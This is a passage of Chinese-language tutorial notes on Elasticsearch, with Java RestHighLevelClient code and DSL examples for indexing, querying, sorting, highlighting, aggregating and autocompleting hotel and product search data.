\\\"all\\\":{\\n\" + \" \\\"type\\\": \\\"text\\\",\\n\" + \" \\\"analyzer\\\": \\\"ik_smart\\\"\\n\" + \" }\\n\" + \" }\\n\" + \" }\"; createIndexRequest.mapping(json, XContentType.JSON); //3.发出创建的请求，得到响应 // 参数一： 创建的请求对象， 参数二：创建索引库参数，我们都使用默认即可 CreateIndexResponse response = indicesClient.create(createIndexRequest, RequestOptions.DEFAULT); //4. 查看响应状态 log.info(\"创建成功了吗？\" + response.isAcknowledged()); } 增删查改文档 /** * 添加文档 */ @Test public void addDoc() throws IOException { //根据id查询数据库内容 Hotel hotel = hotelMapper.selectById(36934); //转换为Doc的对象 HotelDoc hotelDoc = new HotelDoc(hotel); //创建请求对象 //设置添加数据POST hotel/_doc/{id}中的id IndexRequest request = new IndexRequest(\"hotel\").id(hotelDoc.getId().toString()); //将对象转换为json，添加到请求中 String json = JSON.toJSONString(hotelDoc); request.source(json, XContentType.JSON); //执行请求 IndexResponse response = highLevelClient.index(request, RequestOptions.DEFAULT); //查看响应结果 log.info(response.getId()); } /** * 修改文档 */ @Test public void updateDoc() throws IOException { //1.根据id查询mysql数据，查找到酒店Hotel Hotel hotel = hotelMapper.selectById(36934); //2.先把Hotel转换为HotelDoc，然后把HotelDoc转换为json HotelDoc hotelDoc = new HotelDoc(hotel); hotelDoc.setPrice(100); String json = JSON.toJSONString(hotelDoc); //3.创建一个文档请求对象 IndexRequest request = new IndexRequest(\"hotel\").id(hotelDoc.getId().toString()); request.source(json, XContentType.JSON); //4.发出文档请求对象 IndexResponse response = highLevelClient.index(request, RequestOptions.DEFAULT); //5. 查看响应结果 log.info(\"添加成功的酒店id：\" + response.getId()); } /** * 查询文档 */ @Test public void findDoc() throws IOException { Long id = 36934L; //1.创建请求 GetRequest request = new GetRequest(\"hotel\").id(id.toString()); //2.执行请求 GetResponse response = highLevelClient.get(request, RequestOptions.DEFAULT); //3.取出结果 String hotelDocStr = response.getSourceAsString(); HotelDoc hotelDoc = JSON.parseObject(hotelDocStr, HotelDoc.class); log.info(String.valueOf(hotelDoc)); } /** * 删除文档 */ @Test public void deleteDoc() throws IOException { //1.创建一个删除请求，设置操作的索引库和id DeleteRequest request = new DeleteRequest(\"hotel\").id(\"36934\"); //2.发出请求 DeleteResponse response = highLevelClient.delete(request, RequestOptions.DEFAULT); log.info(\"删除的文档是：\" + response.getId()); } 批量添加 Bulk 批量操作是将文档的增删改查一些列操作，通过一次请求全都做完。减少网络传输次数。 /** * 批量添加 */ @Test public void batchAdd() throws IOException { //1.查询所有的酒店 List hotelList = hotelMapper.selectList(null); //2.创建一个批量请求的对象 BulkRequest bulkRequest = new BulkRequest(); //3.遍历所有的酒店，每一个hotel都转化为HotelDoc，并且转换json，创建 单个请求对象，并且设置请求参数 for (Hotel hotel : hotelList) { //每一个hotel都转化为HotelDoc，并且转换json HotelDoc hotelDoc = new HotelDoc(hotel); String json = JSON.toJSONString(hotelDoc); //创建 单个请求对象，并且设置请求参数 IndexRequest indexRequest = new IndexRequest(\"hotel\"); indexRequest.id(hotelDoc.getId().toString()); indexRequest.source(json, XContentType.JSON); //4. 把单个请求对象添加到批量请求对象里面 bulkRequest.add(indexRequest); } //5. 发送批量请求 BulkResponse responses = highLevelClient.bulk(bulkRequest, RequestOptions.DEFAULT); log.info(\"添加成功了吗？\" + responses.status()); } ElasticSearch高级搜索-常用搜索 常见查询类型 查询所有：查询出所有数据 match_all 全文检索查询：利用分词器对用户输入内容分词，然后去索引库中匹配。比如：输入框搜索 match_query：单字段查询 multi_match_query：多字段查询 精确查询：根据精确词条查找数据，一般是keyword、数值、日期、boolean类型字段 ids term：根据词条精确值查询 range：根据值的范围查询 地理查询：干锅居经纬度查询 geo_bounding_box：矩形范围查询 geo_distance：附近查询 复合查询：可以将上述查询条件组合起来合并查询 bool：布尔查询 must：必须匹配每个子查询，类似and，参与算分 filter：效果和must一样，不参与算分 should：选择性匹配子查询，类似or，参与算分 must_not：必须不匹配，类似not，不参与算分 function_score：算分查询 全文检索查询 match_query：单字段查询 multi_match_query：多字段查询 因为是拿着词条去匹配，因此参与搜索的字段也必须是可分词的text类型的字段 搜索字段越多，对查询性能影响越大，因此建议采用copy_to，然后单字段查询的方式 #搜索全部 GET hotel/_search { \"query\": { \"match_all\": {} } } #match单字段查询 #查询all字段中的如家酒店 #如家酒店被分词：如家、酒店 GET /hotel/_search { \"query\": { \"match\": { \"all\": \"如家酒店\" } }, \"size\": 200 } #搜索结果默认采用的or并集，不是and交集 #默认显示的是20个数据 GET hotel/_search { \"query\": { \"match\": { \"name\": { \"query\": \"如家酒店\", \"operator\": \"or\" } } }, \"size\": 20 } #multi_match多字段查询，不推荐使用多字段搜索，如果需要多字段搜索，建议使用all字段 GET /hotel/_search { \"query\": { \"multi_match\": { \"query\": \"如家酒店\", \"fields\": [\"name\",\"brand\"] } } } @SpringBootTest @Slf4j public class SearchTest { @Autowired private RestHighLevelClient highLevelClient; /** * 定义一个方法处理搜索的响应结果 */ private void handlerResponse(SearchResponse response) { //获取查询结果 SearchHits searchHits = response.getHits(); //获取总记录数 Long total = searchHits.getTotalHits().value; log.info(\"本次查询的总记录数：\" + total); //获取本次搜索的结果列表 SearchHit[] hits = searchHits.getHits(); for (SearchHit hit : hits) { //得到酒店的json数据 String hotelJson = hit.getSourceAsString(); //将json对象转换为hotelDoc对象 HotelDoc hotelDoc = JSON.parseObject(hotelJson, HotelDoc.class); //处理高亮显示结果 HighlightField nameField = hit.getHighlightFields().get(\"name\"); if (nameField != null) { hotelDoc.setName(nameField.getFragments()[0].toString()); } HighlightField brandField = hit.getHighlightFields().get(\"brand\"); if (brandField != null) { hotelDoc.setBrand(brandField.getFragments()[0].toString()); } //获取距离 Object[] sortValues = hit.getSortValues(); if (sortValues != null && sortValues.length > 0) { log.info(hotelDoc + \"距离您：\" + sortValues[0] + \"公里\"); } else { log.info(String.valueOf(hotelDoc)); } } } /** * 搜索如家酒店 */ @Test public void searchHotel() throws IOException { //1.创建一个搜索的请求对象 SearchRequest searchRequest = new SearchRequest(\"hotel\"); //2.设置搜索条件 searchRequest.source().query(QueryBuilders.matchQuery(\"all\", \"如家酒店\")); searchRequest.source().size(200); //3.发出搜索请求 SearchResponse response = highLevelClient.search(searchRequest, RequestOptions.DEFAULT); //4.调用方法处理搜索的响应结果 handlerResponse(response); } 精确查询 term：根据词条精确值查询 range：根据值的范围查询 查询时，用户输入的内容跟值完全匹配时才认为符合条件。如果用户输入的内容过多，反而搜索不到数据 # 搜索上海的所有酒店 GET hotel/_search { \"query\": { \"term\": { \"city\": { \"value\": \"上海\" } } } } #搜索价格在100-200之间的酒店 GET hotel/_search { \"query\": { \"range\": { \"price\": { \"gte\": 100, \"lte\": 200 } } } } /** * 查询价格在100-200的酒店 */ @Test public void searchHotel2() throws IOException { //创建一个搜索的请求对象 SearchRequest searchRequest = new SearchRequest(\"hotel\"); //设置搜索条件 searchRequest.source().query(QueryBuilders.rangeQuery(\"price\").gte(100).lte(200)); //发出请求 SearchResponse response = highLevelClient.search(searchRequest, RequestOptions.DEFAULT); //处理响应结果 handlerResponse(response); } 地理坐标查询 geo_bounding_box：矩形范围查询，需要指定矩形的左上、右下两个点的坐标 geo_distance：附近查询，查询到指定中心点小于某个距离值的所有文档 常用的是附近查询 #附近查询，也叫距离查询 GET hotel/_search { \"query\": { \"geo_distance\": { \"distance\": \"5km\", \"location\": \"31.21,121.5\" } } } #lat:纬度，lon:经度 GET hotel/_search { \"query\": { \"geo_distance\": { \"distance\": \"5km\", \"location\": { \"lat\": 31.21, \"lon\": 121.5 } } } } 复合查询-布尔查询（多重查询） 比如在搜索酒店时，除了关键字搜索外，我们还可能根据品牌、价格、城市等字段做过滤 每一个不同的字段，其查询的条件、方式都不一样，必须是多个不同的查询，而要组合这些查询，就必须用bool查询了 参与打分的字段越多，查询的性能也越差。因此这种多条件查询时，建议： 搜索框的关键字搜索，是全文检索查询，使用must查询，参与算分 其它过滤条件，采用filter查询。不参与算分 #复合查询（布尔查询） # 查询必须是上海的酒店，并且价格不超过400块 # 并且以我为圆心搜索10KM范围之内的 GET /hotel/_search { \"query\": { \"bool\": { \"must\": [ { \"term\": { \"name\": { \"value\": \"如家\" } } } ], \"must_not\": [ { \"range\": { \"price\": { \"gt\": 400 } } } ], \"filter\": { \"geo_distance\": { \"distance\": \"10km\", \"location\": \"31.21,121.5\" } } } }, \"size\": 200 } /** * 搜索名字包含“如家”，价格不高于400，在坐标31.21,121.5周围10km范围内的酒店 */ @Test public void searchHotel3() throws IOException { //创建一个搜索请求 SearchRequest searchRequest = new SearchRequest(\"hotel\"); //设置搜索请求 BoolQueryBuilder boolQueryBuilder = new BoolQueryBuilder(); boolQueryBuilder.must(QueryBuilders.termQuery(\"name\", \"如家\")); boolQueryBuilder.mustNot(QueryBuilders.rangeQuery(\"price\").gt(400)); boolQueryBuilder.filter(QueryBuilders. geoDistanceQuery(\"location\").point(new GeoPoint(\"31.21,121.5\")).distance(\"10\", DistanceUnit.KILOMETERS)); searchRequest.source().query(boolQueryBuilder); searchRequest.source().size(200); //发出请求 SearchResponse response = highLevelClient.search(searchRequest, RequestOptions.DEFAULT); //处理响应结果 handlerResponse(response); } 复合查询-算分函数查询 match查询时，文档结果会根据与搜索词条的关联度打分（_score），返回结果时按照分值降序排列 Elasticsearch默认情况下使用BM25算法（5.1版本以前，使用TF-IDF算法）计算_score得到，按照得到倒序 TF-IDF算法：TF（词频）* IDF（逆文档频率） TF：词条在文档中出现的频率 IDF：计算词条在所有文档中的权重（出现越多文档，权限越低，反之则越高） BM25：是TF-IDF算法是升级版，单个词条的算分有一个上限，不至于过高，让曲线更加平滑 function_score查询包含四部分内容：原始查询条件、过滤条件、算分函数、加权模式。运行流程如下： 根据原始条件查询搜索文档，并且计算相关性算分，称为原始算分（query score） 根据过滤条件，过滤文档 符合过滤条件的文档，基于算分函数运算，得到函数算分（function score） 将原始算分（query score）和函数算分（function score）基于加权模式做运算，得到最终结果，作为相关性算分 举例： #查询如家酒店，对于深圳的如家进行+10分 GET hotel/_search { \"query\": { \"function_score\": { \"query\": { \"match\": { \"name\": \"如家\" } }, \"functions\": [ { \"filter\": { \"term\": { \"city\": \"深圳\" } }, \"weight\": 10 } ], \"boost_mode\": \"sum\" } }, \"size\": 200 } /** * 查询如家酒店，对于深圳的如家进行+10分 */ @Test public void searcherHotel4() throws IOException { //创建搜索请求 SearchRequest searchRequest = new SearchRequest(\"hotel\"); //设置请求 //创建算分函数 FunctionScoreQueryBuilder functionScoreQueryBuilder = new FunctionScoreQueryBuilder(QueryBuilders.matchQuery(\"name\", \"如家\"), new FunctionScoreQueryBuilder.FilterFunctionBuilder[]{ new FunctionScoreQueryBuilder.FilterFunctionBuilder( QueryBuilders.termQuery(\"city\", \"深圳\"), ScoreFunctionBuilders.weightFactorFunction(10)) }).boostMode(CombineFunction.SUM); searchRequest.source().query(functionScoreQueryBuilder); searchRequest.source().size(200); //发出请求 SearchResponse response = highLevelClient.search(searchRequest, RequestOptions.DEFAULT); //处理响应 handlerResponse(response); } ElasticSearch高级搜索-搜索结果处理 排序 elasticsearch默认是根据相关度算分（_score）来排序，但是也支持自定义方式对搜索结果排序。可以排序字段类型有：keyword类型、数值类型、地理坐标类型、日期类型等 排序条件是一个数组，也就是可以写多个排序条件。按照声明的顺序，当第一个条件相等时，再按照第二个条件排序，以此类推 分页 elasticsearch中通过修改from、size参数来控制要返回的分页结果 beginIndex = (当前页-1)*pageSize from：从第几个文档开始，从0开始的 size：总共查询几个文档 普通字段排序（keyword、数值、日期类型） #按价格从低到高排序 GET hotel/_search { \"query\": { \"match\": { \"all\": \"如家\" } }, \"sort\": [ { \"price\": { \"order\": \"asc\" } } ] } 根据距离升序排序 #查找如家酒店，查找离我最近的如家酒店, 分页 GET hotel/_search { \"query\": { \"match\": { \"all\": \"如家\" } }, \"sort\": [ { \"_geo_distance\": { \"location\": \"31.034661,121.612282\", \"order\": \"asc\", \"unit\": \"km\" } } ], \"from\": 0, \"size\": 5 } /** * 假设我的位置是：31.034661，121.612282，寻找我周围距离最近的酒店 */ @Test public void searcherHotel5() throws IOException { //创建搜索请求 SearchRequest searchRequest = new SearchRequest(\"hotel\"); //设置搜索 searchRequest.source().query(QueryBuilders.matchQuery(\"all\", \"如家\")); //排序 searchRequest.source().sort(SortBuilders.geoDistanceSort(\"location\", new GeoPoint(\"31.034661,121.612282\")).unit(DistanceUnit.KILOMETERS).order(SortOrder.ASC)); searchRequest.source().size(200); //分页 searchRequest.source().from(0).size(5); //发出请求 SearchResponse response = highLevelClient.search(searchRequest, RequestOptions.DEFAULT); //处理响应 handlerResponse(response); } 高亮显示 搜索匹配时，关键字会高亮显示 高亮是对关键字高亮，因此搜索条件必须带有关键字，而不能是范围这样的查询。 默认情况下，高亮的字段，必须与搜索指定的字段一致，否则无法高亮 如果要对非搜索字段高亮，则需要添加一个属性：required_field_match=false elasticsearch默认添加的是标签 #高亮显示 GET /hotel/_search { \"query\": { \"match\": { \"name\": \"如家\" } }, \"highlight\": { \"require_field_match\": \"false\", \"fields\": { #指定要高亮的字段 \"name\": {}, \"brand\": {} }, \"pre_tags\": \"\", \"post_tags\": \"\" }, \"size\": 200 } /** * 高亮搜索 */ @Test public void searcherHotel6() throws IOException { //创建搜索请求 SearchRequest searchRequest = new SearchRequest(\"hotel\"); //设置搜索条件 searchRequest.source().query(QueryBuilders.matchQuery(\"name\", \"如家\")); //高亮搜索 HighlightBuilder highlightBuilder = new HighlightBuilder(); highlightBuilder.requireFieldMatch(false).field(\"name\").field(\"brand\").preTags(\"\").postTags(\"\"); searchRequest.source().highlighter(highlightBuilder); searchRequest.source().from(0).size(100); //发出请求 SearchResponse response = highLevelClient.search(searchRequest, RequestOptions.DEFAULT); //处理响应 handlerResponse(response); } 搜索实战-酒店搜索 实体类 package cn.itcast.hotel.pojo; import com.baomidou.mybatisplus.annotation.IdType; import com.baomidou.mybatisplus.annotation.TableField; import com.baomidou.mybatisplus.annotation.TableId; import com.baomidou.mybatisplus.annotation.TableName; import lombok.Data; @Data @TableName(\"tb_hotel\") public class Hotel { @TableId(type = IdType.INPUT) private Long id; private String name; private String address; private Integer price; private Integer score; private String brand; private String city; private String starName; private String business; private String longitude; private String latitude; private String pic; @TableField(\"isAD\") private Boolean isAD; } package cn.itcast.hotel.pojo; import lombok.Data; import lombok.NoArgsConstructor; @Data @NoArgsConstructor public class HotelDoc { private Long id; private String name; private String address; private Integer price; private Integer score; private String brand; private String city; private String starName; private String business; private String pic; private String all; private String location; private Boolean isAD; private Object distance;//距离值 public HotelDoc(Hotel hotel) { this.id = hotel.getId(); this.name = hotel.getName(); this.address = hotel.getAddress(); this.price = hotel.getPrice(); this.score = hotel.getScore(); this.brand = hotel.getBrand(); this.city = hotel.getCity(); this.starName = hotel.getStarName(); this.business = hotel.getBusiness(); this.pic = hotel.getPic(); this.isAD = hotel.getIsAD(); this.location = hotel.getLatitude() + \", \" + hotel.getLongitude(); } } package cn.itcast.hotel.pojo; import lombok.AllArgsConstructor; import lombok.Data; import lombok.NoArgsConstructor; import java.util.List; @Data @NoArgsConstructor @AllArgsConstructor public class PageResult { private Long total; private List list; } package cn.itcast.hotel.pojo; import lombok.Data; @Data public class RequestParams { private String key; private Integer page; private Integer size; private String sortBy; // 下面是新增的过滤条件参数 private String city; private String brand; private String starName; private Integer minPrice; private Integer maxPrice; // 我当前的地理坐标 private String location; } HotelService package cn.itcast.hotel.service.impl; import cn.itcast.hotel.mapper.HotelMapper; import cn.itcast.hotel.pojo.Hotel; import cn.itcast.hotel.pojo.HotelDoc; import cn.itcast.hotel.pojo.PageResult; import cn.itcast.hotel.pojo.RequestParams; import cn.itcast.hotel.service.IHotelService; import com.alibaba.fastjson.JSON; import com.baomidou.mybatisplus.extension.service.impl.ServiceImpl; import org.apache.commons.lang3.StringUtils; import org.elasticsearch.action.search.SearchRequest; import org.elasticsearch.action.search.SearchResponse; import org.elasticsearch.client.RequestOptions; import org.elasticsearch.client.RestHighLevelClient; import org.elasticsearch.common.geo.GeoPoint; import org.elasticsearch.common.lucene.search.function.CombineFunction; import org.elasticsearch.common.unit.DistanceUnit; import org.elasticsearch.index.query.BoolQueryBuilder; import org.elasticsearch.index.query.QueryBuilders; import org.elasticsearch.index.query.functionscore.FunctionScoreQueryBuilder; import org.elasticsearch.index.query.functionscore.ScoreFunctionBuilders; import org.elasticsearch.search.SearchHit; import org.elasticsearch.search.SearchHits; import org.elasticsearch.search.fetch.subphase.highlight.HighlightBuilder; import org.elasticsearch.search.fetch.subphase.highlight.HighlightField; import org.elasticsearch.search.sort.GeoDistanceSortBuilder; import org.elasticsearch.search.sort.SortBuilders; import org.elasticsearch.search.sort.SortOrder; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Service; import java.io.IOException; import java.util.ArrayList; @Service public class HotelService extends ServiceImpl implements IHotelService { @Autowired private RestHighLevelClient highLevelClient; @Override public PageResult list(RequestParams params) { try { //创建搜索请求 SearchRequest searchRequest = new SearchRequest(\"hotel\"); //获取搜索请求参数 String key = params.getKey();//搜索内容 Integer curPage = params.getPage(); Integer size = params.getSize(); //设置搜索条件 BoolQueryBuilder boolQueryBuilder = new BoolQueryBuilder(); //如果没有搜索内容，则搜索全部 if (StringUtils.isEmpty(key)) { boolQueryBuilder.must(QueryBuilders.matchAllQuery()); } else { boolQueryBuilder.must(QueryBuilders.matchQuery(\"all\", key)); } //添加过滤的条件 String city = params.getCity(); String brand = params.getBrand(); String starName = params.getStarName(); Integer minPrice = params.getMinPrice(); Integer maxPrice = params.getMaxPrice(); //城市 if (StringUtils.isNotEmpty(city)) { boolQueryBuilder.filter(QueryBuilders.termQuery(\"city\", city)); } //品牌 if (StringUtils.isNotEmpty(brand)) { boolQueryBuilder.filter(QueryBuilders.termQuery(\"brand\", brand)); } //星级 if (StringUtils.isNotEmpty(starName)) { boolQueryBuilder.filter(QueryBuilders.termQuery(\"starName\", starName)); } //价格 if (minPrice != null && maxPrice != null) { boolQueryBuilder.filter(QueryBuilders.rangeQuery(\"price\").gte(minPrice).lte(maxPrice)); } //算分函数 FunctionScoreQueryBuilder functionScoreQueryBuilder = new FunctionScoreQueryBuilder(boolQueryBuilder, new FunctionScoreQueryBuilder.FilterFunctionBuilder[]{ new FunctionScoreQueryBuilder.FilterFunctionBuilder(QueryBuilders.termQuery(\"isAD\", true), ScoreFunctionBuilders.weightFactorFunction(10)) }).boostMode(CombineFunction.SUM); //searchRequest.source().query(boolQueryBuilder); searchRequest.source().query(functionScoreQueryBuilder); //设置分页 searchRequest.source().from((curPage - 1) * size).size(size); //设置高亮条件 HighlightBuilder highlightBuilder = new HighlightBuilder(); highlightBuilder.requireFieldMatch(false).field(\"name\"); searchRequest.source().highlighter(highlightBuilder); //根据地理位置排序 String location = params.getLocation();//经纬度：116.40400 , 39.92800 if (StringUtils.isNotEmpty(location)) { GeoDistanceSortBuilder sortBuilder = SortBuilders.geoDistanceSort(\"location\", new GeoPoint(location)).unit(DistanceUnit.KILOMETERS).order(SortOrder.ASC); searchRequest.source().sort(sortBuilder); } //发送请求 SearchResponse response = highLevelClient.search(searchRequest, RequestOptions.DEFAULT); //处理响应 //创建一个PageResult用于从响应中提取total和list PageResult pageResult = new PageResult(); ArrayList hotelDocList = new ArrayList<>(); //提取total SearchHits searchHits = response.getHits(); long total = searchHits.getTotalHits().value; //提取list SearchHit[] hits = searchHits.getHits(); for (SearchHit hit : hits) { //得到每个hotel的json String hotelJson = hit.getSourceAsString(); //转换为HotelDoc HotelDoc hotelDoc = JSON.parseObject(hotelJson, HotelDoc.class); //处理高亮 HighlightField nameHighlightField = hit.getHighlightFields().get(\"name\"); if (nameHighlightField != null) { hotelDoc.setName(nameHighlightField.getFragments()[0].toString()); } //添加距离值 Object[] sortValues = hit.getSortValues(); if (sortValues != null && sortValues.length > 0) { hotelDoc.setDistance(sortValues[0]); } hotelDocList.add(hotelDoc); } //传入total和list pageResult.setTotal(total); pageResult.setList(hotelDocList); //返回结果 return pageResult; } catch (IOException e) { e.printStackTrace(); throw new RuntimeException(e); } } } ElasticSearch聚合搜索 ==注意==：参与聚合搜索的字段必须是keyword、日期、数值、布尔类型 桶聚合Bucket：用来对文档做分组，类似mysql的group by Termsaggregation：按照文档字段值分组，例如按照品牌、国家分组 Date Histogram：按照日期阶梯分组，例如一周或一月为一组 度量聚合Metric：用以计算一些值 Avg：求平均值 Max：求最大值 Min：求最小值 Stats：同时求max、min、avg、sum等 管道聚合pipeline：其它聚合的结果为基础做聚合 Bucket聚合 桶聚合 # 按照酒店品牌统计每一个品牌的酒店数量,默认是按照数量降序排序的,目前要求是升序 GET /hotel/_search { \"size\": 0, // 设置size为0，结果中不包含文档，只包含聚合结果 \"aggs\": { // 定义聚合 \"brandAgg\": { //给聚合起个名字 \"terms\": { // 聚合的类型，按照品牌值聚合，所以选择term \"field\": \"brand\", // 参与聚合的字段 \"order\": { \"_count\": \"asc\" // 按照_count升序排列 }, \"size\": 20 // 希望获取的聚合结果数量 } } } } 限定聚合范围（限定要聚合的文档范围） GET /hotel/_search { \"query\": { \"range\": { \"price\": { \"lte\": 200 // 只对200元以下的文档聚合 } } }, \"size\": 0, \"aggs\": { \"brandAgg\": { \"terms\": { \"field\": \"brand\", \"size\": 20 } } } } Metric聚合 度量聚合 GET /hotel/_search { \"size\": 0, \"aggs\": { \"brandAgg\": { \"terms\": { \"field\": \"brand\", \"size\": 20 }, \"aggs\": { // 是brands聚合的子聚合，也就是分组后对每组分别计算 \"score_stats\": { // 聚合名称 \"stats\": { // 聚合类型，这里stats可以计算min、max、avg等 \"field\": \"score\" // 聚合字段，这里是score } } } } } } # 嵌套聚合 # brandAgg的聚合内部嵌套的子聚合scoreAgg # 对每个品牌的酒店平均分做排序 GET /hotel/_search { \"size\": 0, \"aggs\": { \"brandAgg\": { \"terms\": { \"field\": \"brand\", \"size\": 20, \"order\": { \"scoreAgg.avg\": \"desc\" } }, \"aggs\": { \"scoreAgg\": { \"stats\": { \"field\": \"score\" } } } } } } # 统计上海的酒店的每个品牌的平均分高到低排序 # 第一步：查找出上海的酒店 # 第二步：对酒店进行分组 # 第三步：分组之后统计平均分 GET hotel/_search { \"query\": { \"term\": { \"city\": { \"value\": \"上海\" } } }, \"size\": 0, \"aggs\": { \"brandAgg\": { \"terms\": { \"field\": \"brand\", \"size\": 20, \"order\": { \"scoerAgg\": \"desc\" } }, \"aggs\": { \"scoerAgg\": { \"avg\": { \"field\": \"score\" } } } } } } 桶聚合Java代码实现 @SpringBootTest @Slf4j public class AggsTest { @Autowired private RestHighLevelClient highLevelClient; /** * 统计上海的酒店的每个品牌的平均分 */ @Test public void aggsSearch() throws IOException { //创建搜索请求 SearchRequest searchRequest = new SearchRequest(\"hotel\"); //设置搜索条件 //1.查询上海的酒店 searchRequest.source().query(QueryBuilders.termQuery(\"city\",\"上海\")); searchRequest.source().size(0); //2.聚合统计结果 AggregationBuilder aggregationBuilder = AggregationBuilders.terms(\"brandAgg\").field(\"brand\").size(20).order(BucketOrder.aggregation(\"scoreAgg\",false)) .subAggregation(AggregationBuilders.avg(\"scoreAgg\").field(\"score\")); searchRequest.source().aggregation(aggregationBuilder); //发送请求 SearchResponse response = highLevelClient.search(searchRequest, RequestOptions.DEFAULT); //处理响应 Terms brandBuckets = response.getAggregations().get(\"brandAgg\"); List buckets = brandBuckets.getBuckets(); for (Terms.Bucket bucket : buckets) { Object brandName = bucket.getKey(); long count = bucket.getDocCount(); //获取子聚合的结果 Avg avg = bucket.getAggregations().get(\"scoreAgg\"); double avgScore = avg.getValue(); log.info(brandName+\" 数量：\"+ count+\" 均值：\"+ avgScore); } } } 搜索实战 DSL语句 # 通过桶聚合查询城市、星级、品牌 GET hotel/_search { \"size\": 0, \"aggs\": { \"cityAgg\": { \"terms\": { \"field\": \"city\", \"size\": 100 } }, \"starNameAgg\":{ \"terms\": { \"field\": \"starName\", \"size\": 100 } }, \"brandAgg\":{ \"terms\": { \"field\": \"brand\", \"size\": 100 } } } } Elasticsearch拼音搜索 拼音分词插件：https://github.com/medcl/elasticsearch-analysis-pinyin 测试 POST /_analyze { \"text\": \"测试\", \"analyzer\": \"pinyin\" } 自定义分词器 默认的拼音分词器会将每个汉字单独分为拼音，而我们希望的是每个词条形成一组拼音，需要对拼音分词器做个性化定制，形成自定义分词器。 ==自定义分词器是属于某一个索引库的，并不是全局的== 分词器的组成包含三部分 character filters：在tokenizer之前对文本进行处理。例如删除字符、替换字符 tokenizer：将文本按照一定的规则切割成词条（term）。例如keyword，就是不分词；还有ik_smart tokenizer filter：将tokenizer输出的词条做进一步处理。例如大小写转换、同义词处理、拼音处理等 声明自定义分词器 # 自定义分词器 #analyzer: 默认情况下，构建和搜索索引库时都使用该分词器，但如果存在search_analyzer属性后，只在构建时使用 #search_analyzer：只用在搜索索引库时 # 创建索引库时，自定义分词器 PUT /test { \"settings\": { \"analysis\": { \"analyzer\": { \"my_analyzer\": { \"tokenizer\": \"ik_smart\", \"filter\": \"py\" } }, \"filter\": { \"py\": { \"type\": \"pinyin\", \"keep_full_pinyin\": false, \"keep_joined_full_pinyin\": true, \"keep_original\": true, \"limit_first_letter_length\": 16, \"remove_duplicated_term\": true, \"none_chinese_pinyin_tokenize\": false } } } }, \"mappings\": { \"properties\": { \"name\":{ \"type\": \"text\", \"analyzer\": \"my_analyzer\", \"search_analyzer\": \"ik_smart\" } } } } Elasticsearch自动补全 Elasticsearch提供了Completion Suggester查询来实现自动补全功能。这个查询会匹配以用户输入内容开头的词条并返回。为了提高补全查询的效率，对于文档中字段的类型有一些约束： 参与补全查询的字段必须是completion类型。 字段的内容一般是用来补全的多个词条形成的数组。[\"如家酒店\",\"如家宾馆\"] 功能实现 构建索引库 PUT /hotel { \"settings\": { \"analysis\": { \"analyzer\": { \"text_anlyzer\": { \"tokenizer\": \"ik_max_word\", \"filter\": \"py\" }, \"completion_analyzer\": { \"tokenizer\": \"keyword\", \"filter\": \"py\" } }, \"filter\": { \"py\": { \"type\": \"pinyin\", \"keep_full_pinyin\": false, \"keep_joined_full_pinyin\": true, \"keep_original\": true, \"limit_first_letter_length\": 16, \"remove_duplicated_term\": true, \"none_chinese_pinyin_tokenize\": false } } } }, \"mappings\": { \"properties\": { \"id\":{ \"type\": \"long\" }, \"name\":{ \"type\": \"text\", \"analyzer\": \"text_anlyzer\", \"search_analyzer\": \"ik_smart\", \"copy_to\": \"all\" }, \"price\":{ \"type\": \"long\" }, \"stock\":{ \"type\": \"integer\" }, \"image\":{ \"type\": \"keyword\" }, \"category\":{ \"type\": \"keyword\", \"copy_to\": \"all\" }, \"brand\":{ \"type\": \"keyword\", \"copy_to\": \"all\" }, \"spec\":{ \"type\": \"keyword\" }, \"sold\":{ \"type\": \"integer\" }, \"isAD\":{ \"type\": \"boolean\" }, \"commentCount\":{ \"type\": \"integer\" }, \"all\":{ \"type\": \"text\", \"analyzer\": \"text_anlyzer\", \"search_analyzer\": \"ik_smart\" }, \"suggestion\":{ \"type\": \"completion\", \"analyzer\": \"completion_analyzer\" } } } } 修改Doc @Data public class ItemDoc { private Long id;//商品id private String name;//商品名称 private Long price;//价格（分） private Integer stock;//库存数量 private String image;//商品图片 private String category;//分类名称 private String brand;//品牌名称 private String spec;//规格 private Integer sold;//销量 private Integer commentCount;//评论数 private Boolean isAD;//商品状态 1-正常，2-下架 //自动补全字段 private List suggestion; public ItemDoc(Item item){ BeanUtils.copyProperties(item,this); this.suggestion= Arrays.asList(this.brand,this.category); } } 搜索实战-酒店搜索 @Service public class HotelService extends ServiceImpl implements IHotelService { @Autowired(required = false) private HotelMapper hotelMapper; @Autowired private RestHighLevelClient highLevelClient; @Override public PageResult list(RequestParams params) { try { //创建搜索请求 SearchRequest searchRequest = new SearchRequest(\"hotel\"); //获取搜索请求参数 Integer curPage = params.getPage(); Integer size = params.getSize(); //布尔搜索 BoolQueryBuilder boolQueryBuilder = getBoolQueryBuilder(params); //算分函数 FunctionScoreQueryBuilder functionScoreQueryBuilder = new FunctionScoreQueryBuilder(boolQueryBuilder, new FunctionScoreQueryBuilder.FilterFunctionBuilder[]{ new FunctionScoreQueryBuilder.FilterFunctionBuilder(QueryBuilders.termQuery(\"isAD\", true), ScoreFunctionBuilders.weightFactorFunction(10)) }).boostMode(CombineFunction.SUM); //searchRequest.source().query(boolQueryBuilder); searchRequest.source().query(functionScoreQueryBuilder); //设置分页 searchRequest.source().from((curPage - 1) * size).size(size); //设置高亮条件 HighlightBuilder highlightBuilder = new HighlightBuilder(); highlightBuilder.requireFieldMatch(false).field(\"name\"); searchRequest.source().highlighter(highlightBuilder); //根据地理位置排序 String location = params.getLocation();//经纬度：116.40400 , 39.92800 if (StringUtils.isNotEmpty(location)) { GeoDistanceSortBuilder sortBuilder = SortBuilders.geoDistanceSort(\"location\", new GeoPoint(location)).unit(DistanceUnit.KILOMETERS).order(SortOrder.ASC); searchRequest.source().sort(sortBuilder); } //发送请求 SearchResponse response = highLevelClient.search(searchRequest, RequestOptions.DEFAULT); //处理响应 //创建一个PageResult用于从响应中提取total和list PageResult pageResult = new PageResult(); ArrayList hotelDocList = new ArrayList<>(); //提取total SearchHits searchHits = response.getHits(); long total = searchHits.getTotalHits().value; //提取list SearchHit[] hits = searchHits.getHits(); for (SearchHit hit : hits) { //得到每个hotel的json String hotelJson = hit.getSourceAsString(); //转换为HotelDoc HotelDoc hotelDoc = JSON.parseObject(hotelJson, HotelDoc.class); //处理高亮 HighlightField nameHighlightField = hit.getHighlightFields().get(\"name\"); if (nameHighlightField != null) { hotelDoc.setName(nameHighlightField.getFragments()[0].toString()); } //添加距离值 Object[] 